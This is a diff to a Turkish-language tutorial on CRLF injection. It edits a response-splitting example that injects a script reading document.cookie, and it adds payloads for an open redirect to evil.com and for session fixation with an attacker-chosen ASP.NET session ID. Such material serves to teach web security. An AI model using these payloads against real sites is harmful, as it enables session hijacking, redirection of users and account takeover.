@@ -10,7 +10,7 @@ CRLF injection ile en kolay istismar yöntemi, sayfanın gövdesini (body) yenid
 
 Örnek istek:
 ```url
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Cscript%3Ealert(document.cookie)%3C/script%3E
 ```
 
 Sunucu yanıtı:
@@ -22,6 +22,36 @@ Content-Length: 39
  
 <script>alert(document.cookie)</script>
 ```
+
+# Open Redirect
+Kullanıcı girdisi, Location header’ında kullanılıyorsa, CRLF enjekte edilerek saldırgan yeni bir Location header ekleyebilir.
+
+Örnek istek:
+```url
+%0D%0ALocation:%20https://evil.com
+```
+
+Sunucu yanıtı:
+```http
+HTTP/1.1 302 Found
+Location: /normal-path
+Location: https://evil.com
+```
+
+# Cookie Injection ve Session Fixation
+Set-Cookie header’ında kullanıcı girdisi kontrolsüz kullanılıyorsa, saldırgan yeni cookie başlıkları enjekte edebilir.
+
+Örnek istek:
+```http
+%0D%0ASet-Cookie:%20aASP.NET_SessionId=doonz8hcdquy72tkvfflqy34d;
+```
+
+Sunucu yanıtı:
+```
+Set-Cookie: ASP.NET_SessionId=doonz8hcdquy72tkvfflqy34d;
+```
+
+Bu durumda saldırgan, kullanıcının tarayıcısına kendi belirlediği sessionid değerini yazdırarak Session Fixation saldırısı gerçekleştirebilir. Kullanıcı bu session ID ile oturum açtığında, saldırgan aynı oturumu kullanarak hesabı ele geçirebilir (Account Takeover).
 
 # Filter Bypass
 RFC 7230, çoğu HTTP başlık alanı değerinin yalnızca US-ASCII karakter setinin bir alt kümesini kullanması gerektiğini belirtir.
